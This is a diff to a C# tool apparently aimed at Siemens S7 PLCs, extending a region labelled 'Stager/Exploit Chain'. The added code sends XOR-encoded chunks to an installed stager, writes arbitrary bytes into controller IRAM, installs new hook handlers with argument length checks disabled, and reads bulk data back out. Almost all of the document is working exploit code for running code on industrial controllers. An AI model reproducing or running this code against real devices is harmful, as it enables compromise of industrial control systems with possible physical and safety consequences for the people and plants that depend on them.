@@ -5,6 +5,7 @@ using System.Linq;
 using System.IO;
 using System.Text;
 using System.Diagnostics;
+using System.Threading;
 
 namespace S7_Csharp_Utility
 {
@@ -21,6 +22,8 @@ namespace S7_Csharp_Utility
         private const uint IRAM_STAGER_START = 0x10030100;
         private const uint ADD_HOOK_TABLE_START = 0x1003ABA0;
         private const int DEFAULT_STAGER_ADDHOOK_IND = 0x20;
+        private const int DEFAULT_SECOND_ADD_HOOK_IND = 0x1a;
+        private const uint NEXT_PAYLOAD_LOCATION = 0x10010100;
 
         // Protocol constants
         private static readonly byte[] ANSW_ENTER_SUBPROTO_SUCCESS = { 0x80, 0x00 };
@@ -139,7 +142,7 @@ namespace S7_Csharp_Utility
         }
         #endregion
 
-        #region Exploit Chain
+        #region Stager/Exploit Chain
         public async Task<bool> PerformHandshakeAsync()
         {
             _log("Starting handshake...");
@@ -160,8 +163,6 @@ namespace S7_Csharp_Utility
                     if (bytesRead >= 5 && buffer[0] == 5 && Encoding.ASCII.GetString(buffer, 1, 4) == "-CPU")
                     {
                         _log("Handshake successful, got special access greeting.");
-                        // This is a simplified version of the original client's unrecv.
-                        // We just proceed to the next step, assuming the stream is ready.
                         return true;
                     }
                 }
@@ -261,6 +262,112 @@ namespace S7_Csharp_Utility
 
             await WriteToIram(ADD_HOOK_TABLE_START + 8 * DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
             _log("Stager installation complete.");
+        }
+        #endregion
+
+        #region Stager Communication
+        private byte[] EncodePacketForStager(byte[] chunk)
+        {
+            for (int i = 1; i < 256; i++)
+            {
+                byte key = (byte)i;
+                bool keyInChunk = chunk.Contains(key);
+                bool keyIsLength = (key == chunk.Length + 2);
+                if (!keyInChunk && !keyIsLength)
+                {
+                    var encoded = new byte[chunk.Length + 1];
+                    encoded[0] = key;
+                    for (int j = 0; j < chunk.Length; j++)
+                    {
+                        encoded[j + 1] = (byte)(chunk[j] ^ key);
+                    }
+                    return encoded;
+                }
+            }
+            throw new Exception("Could not find a suitable XOR key to encode chunk.");
+        }
+
+        public async Task SendFullMsgViaStager(byte[] msg)
+        {
+            int maxChunkSize = MAX_MSG_LEN - 1;
+            for (int i = 0; i < msg.Length; i += maxChunkSize)
+            {
+                int size = Math.Min(maxChunkSize, msg.Length - i);
+                var chunk = new byte[size];
+                Array.Copy(msg, i, chunk, 0, size);
+
+                _log($"Stager send progress: {i}/{msg.Length}");
+
+                var encoded = EncodePacketForStager(chunk);
+                await SendPacketAsync(encoded, 8, 10);
+
+                var ack = await ReceivePacketAsync();
+                if (ack == null || ack.Length != 1)
+                {
+                    throw new Exception("Did not receive expected empty ACK from stager.");
+                }
+            }
+            // Send empty packet to signify end of transmission
+            await SendPacketAsync(EncodePacketForStager(Array.Empty<byte>()));
+            await ReceivePacketAsync();
+        }
+
+        public async Task<byte[]> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true)
+        {
+            if (hookNo < 0 || hookNo > 0x20)
+                throw new ArgumentOutOfRangeException(nameof(hookNo));
+
+            var payload = new byte[1 + args.Length];
+            payload[0] = (byte)hookNo;
+            Array.Copy(args, 0, payload, 1, args.Length);
+
+            return await InvokePrimaryHandler(0x1c, payload, awaitResponse);
+        }
+
+        public async Task WriteViaStager(uint address, byte[] contents)
+        {
+            var addressBytes = new byte[]
+            {
+                (byte)(address >> 24),
+                (byte)(address >> 16),
+                (byte)(address >> 8),
+                (byte)address
+            };
+            await InvokeAddHook(DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
+            await SendFullMsgViaStager(contents);
+        }
+
+        public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo)
+        {
+            // Set up function pointer and disable arbitrary argument length check
+            var hookEntry = new byte[8];
+            hookEntry[3] = 0xff; // Variable length
+            hookEntry[4] = (byte)(targetAddress >> 24);
+            hookEntry[5] = (byte)(targetAddress >> 16);
+            hookEntry[6] = (byte)(targetAddress >> 8);
+            hookEntry[7] = (byte)targetAddress;
+            await WriteViaStager(ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry);
+
+            // Write the code of the handler itself
+            await WriteViaStager(targetAddress, payload);
+        }
+
+        public async Task<byte[]> ReceiveMany(IProgress<long> progress, int timeoutMs = 5000)
+        {
+            using (var ms = new MemoryStream())
+            {
+                while (true)
+                {
+                    var chunk = await ReceivePacketAsync(timeoutMs);
+                    if (chunk == null || chunk.Length == 0)
+                    {
+                        break;
+                    }
+                    await ms.WriteAsync(chunk, 0, chunk.Length);
+                    progress?.Report(ms.Length);
+                }
+                return ms.ToArray();
+            }
         }
         #endregion
     }
